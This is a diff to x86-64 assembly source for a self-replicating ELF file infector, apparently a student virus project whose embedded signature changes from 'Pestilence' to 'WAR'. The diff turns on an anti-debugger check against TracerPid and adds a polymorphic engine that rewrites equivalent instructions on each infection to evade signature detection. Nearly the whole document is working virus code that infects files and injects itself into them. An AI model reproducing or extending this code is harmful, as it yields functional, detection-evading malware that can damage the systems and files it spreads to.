@@ -8,17 +8,14 @@ PUSH
 
 mov rbp, rsp
 sub rbp, famine_size  ; reserve famine_size bytes on the stack
-
 OBF_POLY_1
-
-
-dd 0x90909090
 .poly_nop_1:
 dd 0x90909090		; this line is to be replaced by random polymorphic instruction equl to 4byte nop
-dd 0x90909090
 
 .check_status:		;open the /proc/self/status
-xor rdi ,rdi
+xor rdi, rdi
+dd 0x90909090
+db 0x90
 lea rdi, STACK(famine.file_path)
 
 
@@ -38,7 +35,6 @@ mov rax, 0x0102DFDFCC
 add rsi, rax
 mov qword[rdi], rsi
 sub rdi, 12
-
 
 
 mov rsi, O_RDONLY
@@ -70,7 +66,7 @@ loop .loop_status
 .check_trcr:
 add r12, 12
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
-;jne _exx_pop
+jne _exx_pop
 
 
 
@@ -273,7 +269,6 @@ jmp .enc_start
 	cmp rax, 0
 	jne .skip_durex
 
-
 ;	CLOSE FD 1 AND 2 FOR FORKED  DUREX PROCESS
 	mov rax, _close
 	mov rdi, 1
@@ -390,7 +385,6 @@ jmp .enc_start
 lea rdi, [rel infect_dir] ; load dir str
 .opendir:
 	mov r14, rdi
-	OBF_GENERIC
 	mov rsi, O_RDONLY | O_DIRECTORY
 	mov rax, _open
 	syscall				;	open directory
@@ -487,7 +481,10 @@ process:
 	mov r8, STACK(famine.file_fd)  ; restore file_fd
 	mov r10, MAP_SHARED
 	mov rdx, PROT_READ | PROT_WRITE
+	.poly_xor_rdi_1:
 	xor rdi, rdi
+	dd 0x90909090
+	db 0x90
 	mov rax, _mmap
 	syscall
 
@@ -607,7 +604,7 @@ inject_self:
 	mov r13, STACK(famine.file_data)
 	add r13, rax
 	sub r13, BEGIN_SIGNATURE_OFFSET_FORM_END
-	cmp byte[r13], 'P'
+	cmp byte[r13], 'W'
 	je .return_pop
 
 	; get delta  ( address at execution time)
@@ -635,12 +632,26 @@ inject_self:
 	mov byte[r10], 0
 
 	;try and build array of offset to poly_nop
+	;POLY NOP SETUP
+	.poly_xor_r11_1:
 	xor r11, r11
+	nop
+	nop
+	nop
+	nop
+	nop
+	
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10], POLY_NOP_1_OFFSET
 	mov qword[r10+8], POLY_NOP_2_OFFSET
 	mov qword[r10+16], POLY_NOP_3_OFFSET
-	mov word[r10+24], 0x1111
+	mov qword[r10+24], POLY_NOP_4_OFFSET
+	mov qword[r10+32], POLY_NOP_5_OFFSET
+	mov qword[r10+40], POLY_NOP_6_OFFSET
+	mov qword[r10+48], POLY_NOP_7_OFFSET
+	mov qword[r10+56], POLY_NOP_8_OFFSET
+	mov qword[r10+64], POLY_NOP_9_OFFSET
+	mov word[r10+72], 0x1111
 	mov r11, POLY_NOP_NUMBER	; the number of possible polymorphic intrustions 
 	mov r9, POLY_NOP_SIZE	; the size of instruction replaced (equal to the size of replacing one)
 	lea rsi, [rel poly_nop]
@@ -655,7 +666,10 @@ inject_self:
 	push rsi
 	lea rcx, STACK(famine.tocypher)
 	add rcx, qword[r10]
-	xor rdi,rdi
+	.poly_xor_rdi_3:
+	xor rdi, rdi
+	dd 0x90909090
+	db 0x90
 	mov dil, byte STACK(famine.tmp_rand)
 	cmp rdi, r11
 	jl .moddone
@@ -674,7 +688,6 @@ inject_self:
 	mov r11b, byte[rsi]
 	mov byte[rcx], r11b
 	inc rsi
-	inc r10
 	inc rcx
 	dec r9
 	cmp r9, 0
@@ -682,21 +695,71 @@ inject_self:
 	OBF_POP_R9
 	pop r11
 	pop rsi
-	add r10, 0x4
+	add r10, 0x8	; SWITCH TO NEXT OFFSET TO REPLACE ON THE OFFSET TABLE
 	cmp word[r10], 0x1111
 	jne .poly_engine
 	ret
 	;END OF POLY ENGINE 
 
 	.poly_xor1:
-;	xor r11, r11
-;	lea r10, STACK(famine.poly_offsets)
-;	mov qword[r10], POLY_XOR_R10_1_OFFSET
-;	mov word[r10+10], 0x1111
-;	mov r11, POLY_XOR_NUMBER
-;	mov r9, POLY_XOR_SIZE
-;	lea rsi, [rel poly_xor_r10_r10]
-;	call .poly_engine
+	xor r11, r11
+	dd 0x90909090
+	db 0x90
+	lea r10, STACK(famine.poly_offsets)
+	mov qword[r10], POLY_XOR_R10_1_OFFSET
+	mov qword[r10+8], POLY_XOR_R10_2_OFFSET
+	mov word[r10+16], 0x1111
+	mov r11, POLY_XOR_NUMBER
+	mov r9, POLY_XOR_SIZE
+	lea rsi, [rel poly_xor_r10_r10]
+	call .poly_engine
+
+	.poly_xor_r11_3:
+	xor r11, r11
+	dd 0x90909090
+	db 0x90
+	xor r9, r9
+	mov rsi, 0x8
+	
+	.poly_inc_r10:
+	lea r10, STACK(famine.poly_offsets)
+	mov qword[r10+r11], POLY_INC_R10_1_OFFSET
+	add qword[r10+r11], r9
+	add r11, 8
+	add r9, 11
+	dec rsi
+	cmp rsi, 0
+	jne .poly_inc_r10
+	mov qword[r10+r11], 0x1111
+	mov r11, POLY_INC_NUMBER
+	mov r9, POLY_INC_SIZE
+	lea rsi, [rel poly_inc_r10]
+	call .poly_engine
+
+	.poly_xor2:
+	xor r11, r11
+	lea r10, STACK(famine.poly_offsets)
+	mov qword[r10], POLY_XOR_R11_1_OFFSET
+	mov qword[r10+8], POLY_XOR_R11_2_OFFSET
+	mov qword[r10+16], POLY_XOR_R11_2_OFFSET
+	mov qword[r10+24], POLY_XOR_R11_2_OFFSET
+	mov qword[r10+32], 0x1111
+	mov r11, POLY_XOR_R11_NUMBER
+	mov r9, POLY_XOR_R11_SIZE
+	lea rsi, [rel poly_xor_r11_r11]
+	call .poly_engine
+
+	.poly_xor3:
+	xor r11, r11
+	lea r10, STACK(famine.poly_offsets)
+	mov qword[r10], POLY_XOR_RDI_1_OFFSET
+	mov qword[r10+8], POLY_XOR_RDI_2_OFFSET
+	mov qword[r10+16], POLY_XOR_RDI_3_OFFSET
+	mov qword[r10+24], 0x1111
+	mov r11, POLY_XOR_RDI_NUMBER
+	mov r9, POLY_XOR_RDI_SIZE
+	lea rsi, [rel poly_xor_rdi_rdi]
+	call .poly_engine
 
 
 ;	lea r10, STACK(famine.tocypher)
@@ -719,24 +782,38 @@ inject_self:
 	cmp r11b, 7
 	jl .fp
 	inc r12b
+	.poly_xor_r11_5:
 	mov r11, 0
-	.fp:
+	dw 0x9090
+	.fp:						;increase signature 
 	inc r11b
 	add byte[r10], r12b
-	inc r10
+	.poly_inc_r10_1:
+	add r10, 1
+	dd 0x90909090
 	add byte[r10], r11b
-	inc r10
+	add r10, 1
+	dd 0x90909090
 	add byte[r10], r12b
-	inc r10
+	add r10, 1
+	dd 0x90909090
 	add byte[r10], r11b
-	inc r10
+	add r10, 1
+	dd 0x90909090
 	add byte[r10], r12b
-	inc r10
+	add r10, 1
+	dd 0x90909090
 	add byte[r10], r11b
-	inc r10
+	add r10, 1
+	dd 0x90909090
 	add byte[r10], r12b
-	inc r10
+	add r10, 1
+	dd 0x90909090
 	add byte[r10], r11b
+	add r10, 1
+	dd 0x90909090
+	mov r12b, byte STACK(famine.tmp_rand)		;load random val 
+	add byte[r10], r12b							;add random val to last signature byte
 	.done_finger:
 	mov STACK(famine.morph_sign_u), r11	;	save current signature state
 	mov STACK(famine.morph_sign_d), r12	;	save current signature state
@@ -803,6 +880,7 @@ inject_self:
 	mov rdi, STACK(famine.file_fd)
 	mov rsi, r15
 	mov rdx, EHDR_SIZE				; 64 is size of EHDR
+	.poly_xor_r10_2:
 	mov r10, 0
 	mov rax, _pwrite
 	syscall
@@ -848,17 +926,22 @@ inject_self:
 
 ;POLYMORPHIC 4 BYTE NOP WITH DIFFERENT OPCODE
 poly_nop:	add r10, 0
+			add r15, 0
 			or rax, 0
 			and rbx, -1
 			and rsp, -1
 			add rcx, 0
+			or rsi, 0
 			dd 0x90909090
 			mov rbp, rbp
 				db 0x90
+			mov rsi, rsi
+				db 0x90
 
 
+; POLYMORPHIC 6 BYTE xor r10, r10 WITH IFFERENT OPCODES
 poly_xor_r10_r10:	push 0
-						pop r10
+					pop r10
 						push rax
 						pop rax
 
@@ -881,11 +964,78 @@ poly_xor_r10_r10:	push 0
 					mov r10d, 0
 
 
+poly_xor_rdi_rdi:	push 0
+					pop rdi
+						.poly_nop_10:
+						dd 0x90909090
+						db 0x90
+
+					and rdi, 0
+						.poly_nop_11:
+						dd 0x90909090
+
+					sub rdi, rdi
+						.poly_nop_12:
+						dd 0x90909090
+							db 0x90
+
+					xor rdi, rdi
+						.poly_nop_13:
+						dd 0x90909090
+							db 0x90
+					
+					mov rdi, 0
+						dw 0x9090
+							db 0x90
+
+
+
+poly_xor_r11_r11:	push 0
+						pop r11
+						.poly_nop_6:
+						dd 0x90909090
+
+					and r11, 0
+						.poly_nop_7:
+						dd 0x90909090
+
+					sub r11, r11
+						.poly_nop_8:
+						dd 0x90909090
+							db 0x90
+
+					xor r11, r11
+						.poly_nop_9:
+						dd 0x90909090
+							db 0x90
+					
+					mov r11, 0
+						dw 0x9090
+
+; POLYMORPHIC 8BYTE inc r10
+poly_inc_r10:	inc r10
+					.poly_nop_4:
+					dd 0x90909090
+					db 0x90
+
+				add r10, 1
+					.poly_nop_5:
+					dd 0x90909090
+
+				sub r10, 0x7
+				add r10, 0x8
+
+				sub r10, 0x2
+				add r10, 0x3
+
+				add r10, 0x32
+				sub r10, 0x31
+
 
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 enc_end:
 	db 0
-signature		db			0x00, 'Pestilence version 99.0 (c)oded by <araout>42424242', 0xa, 0x00
+signature		db			0x00, 'WAR      - version 99.0 (c)oded by <araout>42424242', 0x0, 0xa
 forbidden		db			"test.out", 0
 famine_entry	dq			_start
 random			db			"/dev/urandom",0,0
